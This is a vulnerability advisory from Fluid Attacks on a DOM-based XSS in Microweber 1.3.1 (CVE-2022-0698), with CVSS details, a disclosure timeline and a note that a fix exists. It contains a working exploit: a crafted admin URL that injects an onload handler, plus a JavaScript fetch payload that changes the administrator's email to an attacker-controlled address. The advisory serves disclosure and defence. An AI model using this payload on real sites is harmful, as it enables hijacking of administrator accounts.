---
slug: advisories/garrix/
title: Microweber 1.3.1  -  DOM XSS to Account Takeover
authors: Carlos Bello
writer: cbello
codename: garrix
product: Microweber 1.3.1
date: 2022-09-19 09:00 COT
cveid: CVE-2022-0698
severity: 8.8
description: Microweber 1.3.1  -  DOM XSS to Account Takeover
keywords: Fluid Attacks, Security, Vulnerabilities, Microweber
banner: advisories-bg
advise: no
template: advisory
---

## Summary

|                       |                                                        |
| --------------------- | -------------------------------------------------------|
| **Name**              | Microweber 1.3.1  -  DOM XSS to Account Takeover       |
| **Code name**         | [Garrix](https://en.wikipedia.org/wiki/Martin_Garrix)  |
| **Product**           | Microweber                                             |
| **Affected versions** | Version 1.3.1                                          |
| **State**             | Private                                                |
| **Release date**      | 2022-09-19                                             |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | ------------------------------------------------------------------------------------------------------ |
| **Kind**              | DOM-Based cross-site scripting (XSS)                                                                   |
| **Rule**              | [371. DOM-Based cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/371)|
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H                                                           |
| **CVSSv3 Base Score** | 8.8                                                                                                    |
| **Exploit available** | Yes                                                                                                    |
| **CVE ID(s)**         | [CVE-2022-0698](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0698)                          |

## Description

Microweber version 1.3.1 allows an unauthenticated user to perform an
account takeover via an XSS on the 'select-file' parameter of the
following URL: http://cbelloatfluid.com/admin/view:modules/load_module:files#select-file=http://cbelloatfluid.com/userfiles/media/default/ovaa-checklist.txt.
It is possible to obtain administrative accounts through a malicious link.

## Vulnerability

The XSS present in Microweber 1.3.1, allows an unauthenticated remote
attacker to perform an Account Takeover. To trigger this vulnerability,
we will need to send the following malicious link to an administrator in
order to hack their account:

* http://cbelloatfluid.com/admin/view:modules/load_module:files#select-file=http://cbelloatfluid.com/userfiles/media/default/ovaa-checklist.php%22onload%3d%22javascript:PAYLOAD%22+///.txt

In the PAYLOAD field we will put the following malicious JS code:

```js
fetch('http://cbelloatfluid.com/api/user/1',{
    method:'POST',
    credentials:'include',
    headers:{
        'Content-type':'application/x-www-form-urlencoded;charset%3dUTF-8'
    },
    body:'id%3d1%26_method%3dPATCH%26username%3dadmin%26email%3dattacker%40fluidattacks.com%26phone%3d\r\n'
})
```

## Exploitation

To exploit this vulnerability, a malicious URL must be sent to the
administrator of the Microweber instance. Once the administrator enters
the link, we will change the email address associated with their account
to one that is under our control.

![normal](https://user-images.githubusercontent.com/51862990/189453637-86fe4ccc-3d3e-4550-a666-b0c947cbee8d.png)

![AccountTakeover](https://user-images.githubusercontent.com/51862990/189451927-3841b94f-9a1c-4c10-b286-6b493a565d36.gif)

![hacked](https://user-images.githubusercontent.com/51862990/189453661-bba7b314-dfdd-4a91-887a-a78b51c112bf.png)

## Our security police

We have reserved the CVE-2022-0698 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Microweber 1.3.1

* Operating System: GNU/Linux

* Web Server: Apache

* PHP Version: 8.1.9

* Database and version: MySQL

## Mitigation

An updated version of Microweber is available at the vendor page.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from the Offensive
Team of `Fluid Attacks`.

## References

**Vendor page** <https://github.com/microweber/microweber>

## Timeline

<time-lapse
  discovered="2022-09-05"
  contacted="2022-09-05"
  replied="2022-09-19"
  confirmed="2022-09-19"
  patched="2022-09-19"
  disclosure="2022-09-19">
</time-lapse>
